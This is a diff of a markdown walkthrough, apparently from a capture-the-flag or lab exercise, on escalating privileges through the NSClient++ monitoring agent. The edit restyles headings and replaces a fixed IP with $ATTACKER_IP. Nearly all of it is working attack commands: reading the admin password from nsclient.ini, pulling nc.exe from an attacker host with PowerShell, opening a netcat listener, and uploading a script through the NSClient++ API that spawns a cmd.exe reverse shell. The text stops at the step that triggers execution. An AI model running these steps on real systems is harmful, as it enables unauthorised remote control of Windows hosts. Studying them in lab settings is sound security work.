@@ -2,35 +2,35 @@
 Check in program files if you found this `NSClient++` tool
 
 
-### Check Password
+### <span style="color:#50FA7B">Check Password</span>
 if you can access this file you will be able to read the password
 ```powershell
 more nsclient.ini
 ```
 
 
-### Download and copy the netcat.exe
+### <span style="color:#50FA7B">Download and copy the netcat.exe</span>
 
 ```bash
 # download
 wget https://github.com/int0x33/nc.exe/blob/master/nc64.exe
 
 # transfer it
-powershell "(new-object System.Net.WebClient).Downloadfile('http://10.10.14.6:8000/nc64.exe', 'nc.exe')"
+powershell "(new-object System.Net.WebClient).Downloadfile('http://$ATTACKER_IP:8000/nc64.exe', 'nc.exe')"
 ```
 
 
-###
-set up a netcat listener on my machine:
+### <span style="color:#50FA7B">Set up a Netcat listener</span>
+Set up a Netcat listener on your machine:
 
 ```bash
 sudo nc -lvnp 4444
 ```
-###  Upload a reverse shell script
+### <span style="color:#50FA7B">Upload a reverse shell script</span>
 Upload a script that runs the binary and connects back:
 
 ```bash
-curl -s -k -u admin -X PUT https://localhost:8443/api/v1/scripts/ext/scripts/root.bat --data-binary "C:\Temp\nc.exe 10.10.14.6 4444 -e cmd.exe"
+curl -s -k -u admin -X PUT https://localhost:8443/api/v1/scripts/ext/scripts/root.bat --data-binary "C:\Temp\nc.exe $ATTACKER_IP 4444 -e cmd.exe"
 ```
 Trigger execution via queries API:
 ```bash
